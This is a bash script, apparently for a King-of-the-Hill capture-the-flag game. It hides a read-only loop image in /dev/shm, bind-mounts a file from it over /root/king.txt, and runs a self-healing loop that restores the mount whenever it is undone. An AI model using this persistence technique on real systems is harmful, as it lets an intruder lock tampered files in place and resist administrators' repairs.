#!/bin/bash

PAYLOAD="pwnk1t"
IMG="/dev/shm/.root_img"
MNT="/dev/shm/.mnt"
TARGET="/root/king.txt"

setup_fs() {
    dd if=/dev/zero of=$IMG bs=1M count=1 >/dev/null 2>&1
    mkfs.ext3 -q $IMG
    mkdir -p $MNT
    mount -o loop $IMG $MNT
    chmod 777 $MNT
    echo "$PAYLOAD" > $MNT/king.txt
    mount -o ro,remount $MNT
}

bind_king() {
    mount --bind $MNT/king.txt $TARGET
}

heal() {
    while true; do
        # Datei manipuliert?
        if [ "$(cat $TARGET 2>/dev/null)" != "$PAYLOAD" ]; then
            umount -f $TARGET 2>/dev/null
            bind_king
        fi

        # Bind-Mount weg?
        mount | grep -q "$TARGET" || bind_king

        sleep 2
    done
}

cleanup() {
    umount -f $TARGET 2>/dev/null
    umount -f $MNT 2>/dev/null
    rm -f $IMG
}
trap cleanup EXIT

setup_fs
bind_king
heal
